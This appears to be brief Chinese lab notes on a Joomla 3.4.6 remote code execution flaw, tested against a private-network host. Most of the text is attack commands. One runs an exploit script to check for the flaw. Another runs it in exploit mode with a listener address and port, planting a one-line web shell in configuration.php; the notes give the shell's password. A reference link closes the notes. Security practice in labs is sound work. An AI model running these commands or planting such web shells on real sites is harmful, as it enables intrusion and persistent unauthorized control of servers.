使用脚本进行验证：显示Vulnerable证明存在漏洞

python3 Joomla-3.4.6-RCE.py -t http://192.168.204.129/exploit/Joomla/

漏洞利用
在configuration.php中写入一句话木马,木马连接密码mbvmmqcrhfnsowwnyvhkkwjejbpytgnznswyefystnqbrirvvg

python3 Joomla-3.4.6-RCE.py -t http://192.168.204.129/exploit/Joomla/ --exploit -l 192.168.204.129 -p 8080


https://www.cnblogs.com/BOHB-yunying/p/11647644.html  文章参考
